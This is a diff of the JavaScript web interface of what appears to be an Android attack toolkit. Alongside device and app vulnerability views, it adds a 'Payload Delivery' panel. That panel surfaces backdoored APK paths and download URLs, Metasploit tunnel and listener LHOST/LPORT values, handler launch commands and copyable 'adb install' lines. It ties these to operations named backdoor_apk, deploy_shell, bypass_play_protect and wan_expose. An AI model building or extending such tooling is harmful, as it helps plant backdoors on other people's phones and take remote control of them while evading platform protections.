+
+  function draw() {
+    ctx.clearRect(0, 0, W, H);
+    ctx.font = FONT;
+    ctx.textBaseline = 'top';
+
+    for (let i = 0; i < tattoos.length; i++) {
+      const t = tattoos[i];
+      t.frame++;
+
+      let alpha;
+      if (t.frame < 0) {
+        alpha = 0;
+      } else if (t.frame < FADE_IN_FRAMES) {
+        alpha = t.maxAlpha * (t.frame / FADE_IN_FRAMES);
+      } else if (t.frame < FADE_IN_FRAMES + HOLD_FRAMES) {
+        // very gentle pulse ±10% during hold
+        const pulse = Math.sin((t.frame - FADE_IN_FRAMES) * 0.03) * 0.1 + 0.9;
+        alpha = t.maxAlpha * pulse;
+      } else if (t.frame < TOTAL_LIFE) {
+        const fadeOut = (t.frame - FADE_IN_FRAMES - HOLD_FRAMES) / FADE_OUT_FRAMES;
+        alpha = t.maxAlpha * (1 - fadeOut);
+      } else {
+        // respawn at new position
+        tattoos[i] = makeTattoo(i);
+        tattoos[i].frame = 0;
+        continue;
+      }
+
+      if (alpha <= 0) continue;
+      ctx.globalAlpha = alpha;
+      ctx.fillStyle   = t.color;
+      ctx.fillText(t.text, t.x, t.y);
+    }
+
+    ctx.globalAlpha = 1;
+    requestAnimationFrame(draw);
+  }
+  draw();
+}
+
 window.onload = () => {
+  initCodeBg();
   buildSidebar();
   startDeviceWatch();
   connectSSE();
   loadSettings();
   detectLhost();
+  pdInit();
   setInterval(updateStatus, 1500);
   setInterval(updateStatusTime, 500);
+  setInterval(pdRefreshSessions, 3000);
 };
+
+function pdInit() {
+  // sync lhost/lport from settings into P&D fields
+  const lhEl = document.getElementById('pd-lhost');
+  const lpEl = document.getElementById('pd-lport');
+  if (lhEl && settings.lhost) lhEl.value = settings.lhost;
+  if (lpEl && settings.lport) lpEl.value = settings.lport;
+}
 
 // ── Sidebar ───────────────────────────────────────────────────────────────────
 function buildSidebar() {
@@ -2091,6 +3690,7 @@ function buildSidebar() {
   for (const [grp, ops] of Object.entries(OPS)) {
     const g = document.createElement('div');
     g.className = 'op-group';
+    g.dataset.cat = OPS_CATS[grp] || 'default';
     const t = document.createElement('div');
     t.className = 'op-group-title';
     t.innerHTML = `<span>${grp}</span><span class="arrow">▾</span>`;
@@ -2117,8 +3717,14 @@ function selectOp(op, el) {
 
 // ── Params ────────────────────────────────────────────────────────────────────
 function renderParams(op) {
-  document.getElementById('op-title').textContent = op.label;
-  document.getElementById('op-desc').textContent = op.desc;
+  const titleEl = document.getElementById('op-title');
+  const descEl  = document.getElementById('op-desc');
+  const phEl    = document.getElementById('params-placeholder');
+  titleEl.textContent = op.label;
+  descEl.textContent  = op.desc;
+  titleEl.style.display = '';
+  descEl.style.display  = '';
+  if (phEl) phEl.style.display = 'none';
   const form = document.getElementById('params-form');
   form.innerHTML = '';
 
@@ -2200,6 +3806,14 @@ function renderParams(op) {
   btn.onclick = runOp;
   form.appendChild(btn);
 
+  // CLI reference line
+  if (op.cli) {
+    const hint = document.createElement('div');
+    hint.className = 'op-cli-hint';
+    hint.innerHTML = `<span class="op-cli-label">CLI</span><code>${op.cli}</code>`;
+    form.appendChild(hint);
+  }
+
   // show process sniffer panel if op has it
   showProcSniff(!!op.hasProcSniff);
   if (op.hasProcSniff) refreshProcs();
@@ -2277,7 +3891,14 @@ function connectSSE() {
   es = new EventSource('/api/stream');
   es.onmessage = (e) => {
     const line = e.data;
-    // detect session-done sentinel
+
+    // ── result sentinel — never goes to terminal ──────────────────────────
+    if (line.startsWith('__RESULT__:')) {
+      try { handleResult(JSON.parse(line.slice(11))); } catch(_) {}
+      return;
+    }
+
+    // ── session-done sentinel ─────────────────────────────────────────────
     const doneMatch = line.match(/^\x1b\[35m\[done:(\d+)\]\x1b\[0m$/) ||
                       line.match(/^\[done:(\d+)\]$/);
     if (doneMatch) {
@@ -2287,30 +3908,136 @@ function connectSSE() {
         s.status = 'done';
         updateSessionsBar();
         showToast(`Session #${sid} (${s.op}) complete`, 'info', 3000);
-        // cleanup done sessions after 8s
         setTimeout(() => { delete _activeSessions[sid]; updateSessionsBar(); }, 8000);
       }
       termLine(line); return;
     }
+
     termLine(line);
     if (line.includes('[qr-captured]') || line.includes('[qr-url-captured]')) {
       setTimeout(loadQR, 500);
     }
-    tryParseFindings(line);
   };
   es.onerror = () => setTimeout(connectSSE, 3000);
 }
 
+// ── Terminal output ───────────────────────────────────────────────────────────
+let _termLineCount = 0;
+let _autoScroll    = true;
+let _wrapMode      = true;
+let _findMatches   = [];
+let _findIdx       = -1;
+
 function termLine(raw) {
   const term = document.getElementById('terminal');
   const span = document.createElement('span'); span.className = 'ln';
-  const ts = document.createElement('span'); ts.className = 'ts'; ts.textContent = now();
-  span.appendChild(ts);
+  const ts   = document.createElement('span'); ts.className   = 'ts';
+  ts.textContent = now();
   span.innerHTML = ts.outerHTML + ansiToHtml(raw);
   term.appendChild(span);
-  term.scrollTop = term.scrollHeight;
+  _termLineCount++;
+  const ct = document.getElementById('term-line-ct');
+  if (ct) ct.textContent = _termLineCount + ' lines';
+  if (_autoScroll) term.scrollTop = term.scrollHeight;
 }
-function clearTerminal() { document.getElementById('terminal').innerHTML = ''; }
+
+function clearTerminal() {
+  document.getElementById('terminal').innerHTML = '';
+  _termLineCount = 0;
+  _findMatches = []; _findIdx = -1;
+  const ct = document.getElementById('term-line-ct');
+  if (ct) ct.textContent = '0 lines';
+  closeFindBar();
+}
+
+function toggleWrap() {
+  _wrapMode = !_wrapMode;
+  const t = document.getElementById('terminal');
+  const b = document.getElementById('wrap-btn');
+  t.classList.toggle('nowrap', !_wrapMode);
+  b.classList.toggle('active', _wrapMode);
+}
+
+function toggleAutoScroll() {
+  _autoScroll = !_autoScroll;
+  document.getElementById('scroll-btn').classList.toggle('active', _autoScroll);
+}
+
+// ── Terminal find ─────────────────────────────────────────────────────────────
+function toggleFindBar() {
+  const bar = document.getElementById('term-find-bar');
+  const isOpen = bar.classList.toggle('open');
+  document.getElementById('term-find-btn').classList.toggle('active', isOpen);
+  if (isOpen) { document.getElementById('term-find-inp').focus(); termFindUpdate(); }
+  else clearFindHighlights();
+}
+
+function closeFindBar() {
+  document.getElementById('term-find-bar').classList.remove('open');
+  document.getElementById('term-find-btn').classList.remove('active');
+  clearFindHighlights();
+}
+
+function termFindKey(e) {
+  if (e.key === 'Enter') { e.shiftKey ? termFindPrev() : termFindNext(); }
+  if (e.key === 'Escape') closeFindBar();
+}
+
+function termFindUpdate() {
+  clearFindHighlights();
+  const q = document.getElementById('term-find-inp').value.toLowerCase();
+  if (!q) { document.getElementById('term-find-count').textContent = ''; return; }
+  const lines = document.getElementById('terminal').querySelectorAll('.ln');
+  _findMatches = [];
+  lines.forEach(ln => {
+    if (ln.textContent.toLowerCase().includes(q)) {
+      ln.classList.add('find-match');
+      _findMatches.push(ln);
+    }
+  });
+  _findIdx = _findMatches.length ? 0 : -1;
+  updateFindCursor();
+}
+
+function clearFindHighlights() {
+  document.getElementById('terminal').querySelectorAll('.find-match,.find-current')
+    .forEach(el => el.classList.remove('find-match','find-current'));
+  _findMatches = []; _findIdx = -1;
+  document.getElementById('term-find-count').textContent = '';
+}
+
+function updateFindCursor() {
+  _findMatches.forEach((el, i) =>
+    el.classList.toggle('find-current', i === _findIdx));
+  const cnt = document.getElementById('term-find-count');
+  cnt.textContent = _findMatches.length
+    ? `${_findIdx + 1}/${_findMatches.length}`
+    : 'no matches';
+  if (_findMatches[_findIdx])
+    _findMatches[_findIdx].scrollIntoView({block:'nearest'});
+}
+
+function termFindNext() {
+  if (!_findMatches.length) return;
+  _findIdx = (_findIdx + 1) % _findMatches.length;
+  updateFindCursor();
+}
+
+function termFindPrev() {
+  if (!_findMatches.length) return;
+  _findIdx = (_findIdx - 1 + _findMatches.length) % _findMatches.length;
+  updateFindCursor();
+}
+
+// Ctrl+F global binding
+document.addEventListener('keydown', e => {
+  if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
+    const termWrap = document.getElementById('terminal-wrap');
+    if (termWrap && termWrap.style.display !== 'none') {
+      e.preventDefault(); toggleFindBar();
+    }
+  }
+});
 
 // ── ANSI ──────────────────────────────────────────────────────────────────────
 const ANSI_MAP = {
@@ -2336,39 +4063,327 @@ function ansiToHtml(s) {
   return result;
 }
 
-// ── Findings ──────────────────────────────────────────────────────────────────
-let _jsonBuf = '';
-function tryParseFindings(line) {
-  _jsonBuf += line;
-  try {
-    const obj = JSON.parse(_jsonBuf);
-    _jsonBuf = '';
-    const vulns = obj?.data?.vulnerabilities || obj?.vulnerabilities || [];
-    if (vulns.length) {
-      findings = findings.concat(vulns);
-      findingsCount = findings.length;
-      const b = document.getElementById('findings-badge');
-      b.textContent = findingsCount; b.style.display = 'inline';
-      renderFindings();
+// ── Findings / Result panel ───────────────────────────────────────────────────
+let _lastResult   = null;
+let _fActiveTab   = 'summary';
+let _fVulnFilter  = 'ALL';
+
+function handleResult(result) {
+  _lastResult = result;
+  const data   = result.data  || {};
+  const vulns  = data.vulnerabilities || [];
+  const fArr   = data.findings        || [];
+  const errors = result.errors        || [];
+
+  // badge
+  const total = vulns.length + fArr.length;
+  findingsCount = total;
+  const b = document.getElementById('findings-badge');
+  if (total) { b.textContent = total; b.style.display = 'inline'; }
+  const vb = document.getElementById('f-vuln-ct');
+  if (vb && vulns.length) { vb.textContent = vulns.length; vb.style.display = 'inline'; }
+
+  // P&D badge + auto-refresh QR view
+  const hasDelivery = fArr.some(f => ['wan_expose','backdoor_apk','deploy_shell','bypass_play_protect','customize_apk'].includes(f.category));
+  if (hasDelivery) {
+    const pb = document.getElementById('pd-badge');
+    if (pb) { pb.textContent = '●'; pb.style.display = 'inline'; }
+    renderQRFromResult(result);
+    pdRefreshQRView();
+    // auto-fill built APK path if returned in findings
+    const bkd = fArr.find(f => ['backdoor_apk','bypass_play_protect','customize_apk'].includes(f.category));
+    if (bkd) {
+      const apkPath = bkd.backdoored || bkd.patched_apk || bkd.apk || '';
+      if (apkPath) {
+        _pdBuiltApk = apkPath;
+        const el = document.getElementById('pd-apk-path');
+        if (el) el.value = apkPath;
+      }
     }
-  } catch(e) { if (!_jsonBuf.includes('{')) _jsonBuf = ''; }
+  }
+
+  if (errors.length) showToast(`${errors.length} error(s) — check Findings › Summary`, 'disconnect', 5000);
+
+  renderFindingsPanel();
 }
 
-function renderFindings() {
-  const panel = document.getElementById('findings-panel');
-  panel.innerHTML = '';
-  if (!findings.length) {
-    panel.innerHTML = '<div style="padding:16px;color:var(--muted);font-size:0.68rem;">No findings yet. Run an operation first.</div>';
+function fTab(name) {
+  _fActiveTab = name;
+  document.querySelectorAll('#f-toolbar .f-tab').forEach(t =>
+    t.classList.toggle('active', t.dataset.ftab === name));
+  renderFindingsPanel();
+}
+
+function renderFindingsPanel() {
+  const body = document.getElementById('f-body');
+  if (!_lastResult) {
+    body.innerHTML = '<div id="f-empty" style="padding:24px 16px;color:var(--muted);font-size:0.7rem;text-align:center;">Run an operation — findings populate here automatically.</div>';
     return;
   }
-  for (const f of findings) {
-    const sev = f.severity || 'INFO';
-    const card = document.createElement('div'); card.className = 'finding-card';
-    card.innerHTML = `<div class="fh"><span class="sev ${sev}">${sev}</span>
-      <b style="font-size:0.75rem;color:var(--white)">${f.id||f.type||'Finding'}</b></div>
-      <div class="fdesc">${f.desc||f.description||''}</div>`;
-    panel.appendChild(card);
+  const data   = _lastResult.data  || {};
+  const vulns  = data.vulnerabilities || [];
+  const fArr   = data.findings        || [];
+  const device = data.device          || null;
+  const apps   = data.applications    || [];
+  const sum    = data.summary         || {};
+  const errors = _lastResult.errors   || [];
+
+  body.innerHTML = '';
+  const t = _fActiveTab;
+
+  // ── SUMMARY ─────────────────────────────────────────────────────────────
+  if (t === 'summary') {
+    const sev = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0,INFO:0};
+    vulns.forEach(v => { const s=v.severity||'INFO'; sev[s]=(sev[s]||0)+1; });
+
+    let html = `<div class="f-summary-chips">`;
+    for (const [s,n] of Object.entries(sev)) {
+      if (n) html += `<span class="sev ${s}" style="cursor:pointer" onclick="fTab('vulns');filterVulns('${s}')">${n} ${s}</span>`;
+    }
+    html += `</div>`;
+
+    html += `<div class="f-section"><div class="f-section-hdr" onclick="this.nextSibling.style.display=this.nextSibling.style.display==='none'?'':'none'">Operation info<span class="f-toggle">▾</span></div>
+    <div class="f-section-body f-kv-grid">`;
+    const kvs = [
+      ['Operation', sum.operation||'—'],
+      ['Timestamp', (sum.timestamp||'').replace('T',' ').slice(0,19)],
+      ['Device', sum.device_serial||'auto'],
+      ['Android', sum.android_version||'—'],
+      ['Rooted', sum.device_rooted ? '⚠ YES' : 'no', sum.device_rooted ? 'warn':''],
+      ['Root via', sum.root_method||'—'],
+      ['Apps scanned', sum.apps_analyzed||0],
+      ['Total vulns', sum.total_vulnerabilities||0],
+      ['Work dir', sum.work_directory||'—'],
+    ];
+    for (const [k,v,cls=''] of kvs)
+      html += `<div class="f-kv"><span class="fk">${k}</span><span class="fv ${cls}">${v}</span></div>`;
+    html += `</div></div>`;
+
+    if (errors.length) {
+      html += `<div class="f-section"><div class="f-section-hdr" style="color:var(--red)">Errors (${errors.length})<span class="f-toggle">▾</span></div><div class="f-errors">`;
+      errors.forEach(e => html += `<div class="f-err-item">${esc(e)}</div>`);
+      html += `</div></div>`;
+    }
+
+    // other findings by category
+    const cats = {};
+    fArr.forEach(f => { (cats[f.category]=cats[f.category]||[]).push(f); });
+    for (const [cat, items] of Object.entries(cats)) {
+      if (['backdoor_apk','wan_expose','deploy_shell','objection_patch'].includes(cat)) continue;
+      html += `<div class="f-section"><div class="f-section-hdr" onclick="this.nextSibling.style.display=this.nextSibling.style.display==='none'?'':'none'">${cat} (${items.length})<span class="f-toggle">▾</span></div><div class="f-section-body">`;
+      items.forEach(f => {
+        const txt = f.finding || f.desc || f.summary || JSON.stringify(f);
+        html += `<div class="f-vuln-row"><div class="f-vuln-text">${esc(txt)}</div></div>`;
+      });
+      html += `</div></div>`;
+    }
+    body.innerHTML = html;
   }
+
+  // ── VULNS ────────────────────────────────────────────────────────────────
+  else if (t === 'vulns') {
+    if (!vulns.length) { body.innerHTML = `<div style="padding:20px;color:var(--muted);text-align:center;font-size:0.7rem;">No vulnerabilities found.</div>`; return; }
+    const sevs = ['ALL','CRITICAL','HIGH','MEDIUM','LOW','INFO'];
+    let html = `<div class="f-filter-row">`;
+    sevs.forEach(s => html += `<button class="f-filt ${s} ${_fVulnFilter===s?'on':''}" onclick="filterVulns('${s}')">${s}</button>`);
+    html += `</div><div id="f-vuln-list">`;
+    const filtered = _fVulnFilter === 'ALL' ? vulns : vulns.filter(v => (v.severity||'INFO') === _fVulnFilter);
+    filtered.forEach(v => {
+      const sev = v.severity||'INFO';
+      const title = v.id || v.type || v.check || v.title || 'Finding';
+      const desc  = v.desc || v.description || v.details || v.finding || '';
+      const rec   = v.recommendation || v.fix || '';
+      const cves  = (v.cves||[]).join(', ') || v.cve || '';
+      html += `<div class="f-vuln-row">
+        <span class="sev ${sev}" style="flex-shrink:0">${sev}</span>
+        <div class="f-vuln-text">
+          <b>${esc(title)}</b>${desc ? esc(desc) : ''}
+          ${rec ? `<div class="f-rec">⤷ ${esc(rec)}</div>` : ''}
+        </div>
+        ${cves ? `<span class="f-cve">${esc(cves)}</span>` : ''}
+      </div>`;
+    });
+    html += `</div>`;
+    body.innerHTML = html;
+  }
+
+  // ── DEVICE ───────────────────────────────────────────────────────────────
+  else if (t === 'device') {
+    if (!device) { body.innerHTML = `<div style="padding:20px;color:var(--muted);text-align:center;font-size:0.7rem;">No device data in this result.</div>`; return; }
+    const fields = [
+      ['Model',         device.model],
+      ['Manufacturer',  device.manufacturer],
+      ['Android',       device.android_version],
+      ['SDK',           device.sdk_version],
+      ['Arch',          device.architecture],
+      ['Serial',        device.serial||'auto'],
+      ['Rooted',        device.rooted ? '⚠ YES':'no', device.rooted?'warn':'ok'],
+      ['Root method',   device.root_method||'—'],
+      ['SELinux',       device.selinux_status],
+      ['Encryption',    device.encryption_status],
+      ['Screen lock',   device.screen_lock?'yes':'no'],
+      ['Dev mode',      device.developer_mode?'on':'off', device.developer_mode?'warn':''],
+      ['USB debug',     device.usb_debugging?'on':'off', device.usb_debugging?'warn':''],
+      ['Bootloader',    device.bootloader_unlocked?'UNLOCKED':'locked', device.bootloader_unlocked?'crit':''],
+      ['Battery',       device.battery_level!=null ? device.battery_level+'%':'—'],
+      ['Security patch',device.security_patch],
+      ['Kernel',        device.kernel_version],
+      ['Chipset',       device.chipset],
+      ['Fingerprint',   device.fingerprint],
+    ];
+    let html = `<div class="f-section"><div class="f-section-hdr">Device</div><div class="f-section-body f-kv-grid">`;
+    fields.forEach(([k,v,cls='']) => v != null
+      ? html += `<div class="f-kv"><span class="fk">${k}</span><span class="fv ${cls}" title="${esc(String(v))}">${esc(String(v)).slice(0,60)}</span></div>`
+      : '');
+    html += `</div></div>`;
+    body.innerHTML = html;
+  }
+
+  // ── APPS ─────────────────────────────────────────────────────────────────
+  else if (t === 'apps') {
+    if (!apps.length) { body.innerHTML = `<div style="padding:20px;color:var(--muted);text-align:center;font-size:0.7rem;">No app profiles. Run app_scan or full to populate.</div>`; return; }
+    let html = '';
+    apps.forEach(app => {
+      const score = app.security_score ?? '—';
+      const scoreClass = score < 40 ? 'crit' : score < 70 ? 'warn' : 'ok';
+      html += `<div class="f-section">
+        <div class="f-section-hdr" onclick="this.nextSibling.style.display=this.nextSibling.style.display==='none'?'':'none'">
+          ${esc(app.package||'?')} <span class="f-score sev ${score<40?'CRITICAL':score<70?'MEDIUM':'INFO'}">${score}/100</span>
+          <span class="f-toggle">▾</span>
+        </div>
+        <div class="f-section-body f-kv-grid">`;
+      const akvs = [
+        ['Version', app.version_name],['Min SDK',app.min_sdk],['Target SDK',app.target_sdk],
+        ['Debuggable',app.debuggable?'⚠ YES':'no',app.debuggable?'warn':''],
+        ['Allow backup',app.allow_backup?'⚠ YES':'no',app.allow_backup?'warn':''],
+        ['Network clear',app.network_cleartext?'⚠ YES':'no',app.network_cleartext?'warn':''],
+        ['Exported act.',app.exported_activities?.length||0],
+        ['Exported svc.',app.exported_services?.length||0],
+        ['Exported recv.',app.exported_receivers?.length||0],
+        ['Dangerous perms',(app.dangerous_permissions||[]).length],
+        ['Secrets found',(app.secrets_found||[]).length,(app.secrets_found?.length?'crit':'')],
+      ];
+      akvs.forEach(([k,v,cls='']) => v != null
+        ? html += `<div class="f-kv"><span class="fk">${k}</span><span class="fv ${cls}">${esc(String(v))}</span></div>` : '');
+      if (app.secrets_found?.length) {
+        html += `</div><div style="padding:6px 14px;border-top:1px solid var(--border2)">`;
+        app.secrets_found.forEach(s => html += `<div class="f-err-item" style="margin-bottom:4px">${esc(s.type||'secret')}: ${esc(s.value||'').slice(0,60)}</div>`);
+      }
+      html += `</div></div>`;
+    });
+    body.innerHTML = html;
+  }
+
+  // ── DELIVERY ─────────────────────────────────────────────────────────────
+  else if (t === 'delivery') {
+    const wanF  = fArr.find(f => f.category === 'wan_expose');
+    const bkdF  = fArr.find(f => f.category === 'backdoor_apk' || f.category === 'deploy_shell' || f.category === 'objection_patch');
+    if (!wanF && !bkdF) {
+      body.innerHTML = `<div style="padding:20px;color:var(--muted);text-align:center;font-size:0.7rem;">No delivery info. Run backdoor_apk or deploy_shell.</div>`;
+      return;
+    }
+    let html = '<div class="f-delivery">';
+
+    if (wanF?.apk_download_url) {
+      html += `<div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:6px;">APK Download URL</div>
+      <div class="f-del-url">
+        <span class="f-url-text">${esc(wanF.apk_download_url)}</span>
+        <button class="f-del-btn primary" onclick="copyText('${esc(wanF.apk_download_url)}')">copy</button>
+        <a class="f-del-btn" href="${esc(wanF.apk_download_url)}" target="_blank">open ↗</a>
+      </div>`;
+    }
+    if (wanF?.msf_tunnel_url) {
+      html += `<div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin:10px 0 6px">MSF Tunnel</div>
+      <div class="f-del-url">
+        <span class="f-url-text">${esc(wanF.msf_tunnel_url)}</span>
+        <button class="f-del-btn" onclick="copyText('${esc(wanF.msf_tunnel_url)}')">copy</button>
+      </div>`;
+    }
+
+    const handlerRc = wanF?.handler_rc || bkdF?.handler_rc;
+    const launchCmd = wanF?.launch_cmd || bkdF?.catch_cmd || bkdF?.launch_cmd;
+    if (launchCmd) {
+      html += `<div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin:10px 0 6px">Handler</div>
+      <div class="f-del-cmd"><code>${esc(launchCmd)}</code><button class="f-del-btn" onclick="copyText('${esc(launchCmd)}')">copy</button></div>`;
+    }
+
+    const apkPath = bkdF?.backdoored || bkdF?.apk || bkdF?.patched_apk;
+    if (apkPath) {
+      const installCmd = `adb install -r "${apkPath}"`;
+      html += `<div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin:10px 0 6px">Manual Install</div>
+      <div class="f-del-cmd"><code>${esc(installCmd)}</code><button class="f-del-btn" onclick="copyText('${esc(installCmd)}')">copy</button></div>`;
+    }
+
+    const lhost = wanF?.msf_lhost || bkdF?.lhost || '—';
+    const lport = wanF?.msf_lport || bkdF?.lport || '—';
+    html += `<div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin:10px 0 6px">Listener</div>
+    <div class="f-del-url" style="gap:16px">
+      <span class="f-url-text">LHOST: <b style="color:var(--white)">${esc(String(lhost))}</b></span>
+      <span class="f-url-text">LPORT: <b style="color:var(--white)">${esc(String(lport))}</b></span>
+      <button class="f-del-btn" onclick="copyText('${esc(lhost)}:${esc(String(lport))}')">copy</button>
+    </div>`;
+
+    html += '</div>';
+
+    // QR codes captured from terminal (ASCII art)
+    if (qrList.length) {
+      html += `<div style="padding:0 14px 8px">`;
+      qrList.forEach(q => {
+        if (q.startsWith('URL:')) return;
+        html += `<div class="f-del-qr">${q.replace(/&/g,'&amp;').replace(/</g,'&lt;')}</div>`;
+      });
+      html += `</div>`;
+    }
+
+    body.innerHTML = html;
+  }
+
+  // ── RAW JSON ─────────────────────────────────────────────────────────────
+  else if (t === 'raw') {
+    const pre = document.createElement('pre');
+    pre.className = 'f-raw';
+    pre.style.cssText = 'padding:14px;font-size:0.65rem;color:var(--muted);overflow:auto;white-space:pre;';
+    pre.textContent = JSON.stringify(_lastResult, null, 2);
+    const wrap = document.createElement('div'); wrap.className = 'f-raw';
+    wrap.appendChild(pre);
+    body.appendChild(wrap);
+  }
+}
+
+function filterVulns(sev) {
+  _fVulnFilter = sev;
+  if (_fActiveTab !== 'vulns') fTab('vulns'); else renderFindingsPanel();
+}
+
+function clearFindings() {
+  _lastResult = null; _fVulnFilter = 'ALL'; _fActiveTab = 'summary';
+  findingsCount = 0;
+  const b = document.getElementById('findings-badge'); if (b) { b.textContent='0'; b.style.display='none'; }
+  const vb = document.getElementById('f-vuln-ct'); if (vb) { vb.style.display='none'; }
+  renderFindingsPanel();
+}
+
+function exportFindings() {
+  if (!_lastResult) return;
+  const blob = new Blob([JSON.stringify(_lastResult, null, 2)], {type:'application/json'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'secv_findings_' + Date.now() + '.json';
+  a.click();
+}
+
+function copyText(txt) {
+  navigator.clipboard.writeText(txt).then(() => showToast('Copied!', 'connect', 1500));
+}
+
+function esc(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+// re-render delivery tab when QR captured from terminal
+function renderQRFromResult(result) {
+  // already populated via handleResult; if delivery tab active, re-render
+  if (_fActiveTab === 'delivery') renderFindingsPanel();
 }
 
 // ── QR ────────────────────────────────────────────────────────────────────────
@@ -2385,45 +4400,520 @@ function loadQR() {
 function renderQR() {
   const panel = document.getElementById('qr-panel');
   panel.innerHTML = '';
-  if (!qrList.length) {
-    panel.innerHTML = '<div style="padding:16px;color:var(--muted);font-size:0.68rem;">No QR codes yet. Run qr_exploit, wan_expose, or rebuild to generate them.</div>';
-    return;
+
+  // pull delivery info from last result if available
+  const fArr = _lastResult?.data?.findings || [];
+  const wanF = fArr.find(f => f.category === 'wan_expose');
+  const bkdF = fArr.find(f => ['backdoor_apk','deploy_shell','objection_patch'].includes(f.category));
+
+  let html = '';
+
+  if (wanF || bkdF) {
+    const apkUrl    = wanF?.apk_download_url || '';
+    const msfTunnel = wanF?.msf_tunnel_url   || '';
+    const lhost     = wanF?.msf_lhost || bkdF?.lhost || '';
+    const lport     = wanF?.msf_lport || bkdF?.lport || '';
+    const launchCmd = wanF?.launch_cmd || bkdF?.catch_cmd || bkdF?.launch_cmd || '';
+    const apkPath   = bkdF?.backdoored || bkdF?.apk || bkdF?.patched_apk || '';
+    const payload   = bkdF?.payload || '';
+
+    html += `<div class="qr-card">
+      <div style="color:var(--muted);font-size:0.58rem;letter-spacing:0.12em;text-transform:uppercase;margin-bottom:10px;">Payload Delivery</div>`;
+
+    if (payload) html += `<div style="font-size:0.62rem;color:var(--muted);margin-bottom:8px">payload: <span style="color:var(--white)">${esc(payload)}</span></div>`;
+
+    if (apkUrl) html += `
+      <div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:4px">APK Download URL</div>
+      <div class="qr-url" style="margin-bottom:8px">${esc(apkUrl)}</div>
+      <div style="display:flex;gap:6px;margin-bottom:12px">
+        <button class="f-del-btn primary" onclick="copyText('${esc(apkUrl)}')">copy URL</button>
+        <a class="f-del-btn" href="${esc(apkUrl)}" target="_blank" style="text-decoration:none">open ↗</a>
+      </div>`;
+
+    if (msfTunnel) html += `
+      <div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:4px">MSF Tunnel</div>
+      <div class="qr-url" style="margin-bottom:8px">${esc(msfTunnel)}</div>
+      <button class="f-del-btn" onclick="copyText('${esc(msfTunnel)}')" style="margin-bottom:12px">copy</button>`;
+
+    if (lhost && lport) html += `
+      <div style="display:flex;gap:20px;align-items:center;padding:8px 0;border-top:1px solid var(--border2);border-bottom:1px solid var(--border2);margin-bottom:12px">
+        <div><span style="font-size:0.58rem;color:var(--muted)">LHOST</span><div style="font-family:var(--mono);font-size:0.78rem;color:var(--white)">${esc(String(lhost))}</div></div>
+        <div><span style="font-size:0.58rem;color:var(--muted)">LPORT</span><div style="font-family:var(--mono);font-size:0.78rem;color:var(--white)">${esc(String(lport))}</div></div>
+        <button class="f-del-btn" onclick="copyText('${esc(lhost)}:${esc(String(lport))}')">copy</button>
+      </div>`;
+
+    if (launchCmd) html += `
+      <div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:4px">Start Handler</div>
+      <div class="f-del-cmd" style="margin-bottom:8px"><code>${esc(launchCmd)}</code><button class="f-del-btn" onclick="copyText('${esc(launchCmd)}')">copy</button></div>`;
+
+    if (apkPath) html += `
+      <div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:4px">Manual ADB Install</div>
+      <div class="f-del-cmd"><code>adb install -r "${esc(apkPath)}"</code><button class="f-del-btn" onclick="copyText('adb install -r \\"${esc(apkPath)}\\"')">copy</button></div>`;
+
+    html += `</div>`;
   }
+
+  // ASCII QR codes captured from terminal
   for (const q of qrList) {
     const card = document.createElement('div'); card.className = 'qr-card';
     if (q.startsWith('URL:')) {
-      card.innerHTML = `<div style="color:var(--muted);font-size:0.58rem;letter-spacing:0.12em;text-transform:uppercase;margin-bottom:6px;">Delivery URL</div>
-        <div class="qr-url">${q.replace('URL: ','')}</div>`;
+      const url = q.replace('URL: ','').trim();
+      card.innerHTML = `<div style="color:var(--muted);font-size:0.58rem;letter-spacing:0.12em;text-transform:uppercase;margin-bottom:6px">Delivery URL</div>
+        <div class="qr-url" style="margin-bottom:8px">${esc(url)}</div>
+        <button class="f-del-btn" onclick="copyText('${esc(url)}')">copy</button>`;
     } else {
-      card.innerHTML = `<div style="color:var(--muted);font-size:0.58rem;letter-spacing:0.12em;text-transform:uppercase;margin-bottom:6px;">QR Code</div>
-        <pre>${q.replace(/&/g,'&amp;').replace(/</g,'&lt;')}</pre>`;
+      card.innerHTML = `<div style="color:var(--muted);font-size:0.58rem;letter-spacing:0.12em;text-transform:uppercase;margin-bottom:6px">QR Code</div>
+        <pre style="color:var(--green);font-size:0.62rem;line-height:1.0">${q.replace(/&/g,'&amp;').replace(/</g,'&lt;')}</pre>`;
     }
-    panel.appendChild(card);
+    panel.innerHTML += card.outerHTML;
   }
+
+  if (!html && !qrList.length)
+    panel.innerHTML = '<div style="padding:20px;color:var(--muted);font-size:0.7rem;text-align:center;">Run backdoor_apk or deploy_shell — delivery info appears here automatically.</div>';
+  else
+    panel.innerHTML = html + panel.innerHTML;
 }
 
 // ── Files ─────────────────────────────────────────────────────────────────────
+// ── File Manager ──────────────────────────────────────────────────────────────
+let fmHostPath = '';
+let fmDevPath  = '/sdcard';
+let fmHostSel  = null;   // selected host entry
+let fmDevSel   = null;   // selected device entry
+
 function loadFiles() {
-  const panel = document.getElementById('files-panel');
-  panel.innerHTML = '<div style="padding:8px;color:var(--muted);font-size:0.68rem;">Loading...</div>';
-  fetch('/api/workdir').then(r => r.json()).then(d => {
-    panel.innerHTML = `<div style="padding:5px 10px;color:var(--muted);font-size:0.58rem;letter-spacing:0.08em;text-transform:uppercase;border-bottom:1px solid var(--border)">
-      Base: ${d.base} · ${(d.files||[]).length} files (newest first)</div>`;
-    for (const f of (d.files||[])) {
-      const row = document.createElement('div'); row.className = 'file-row';
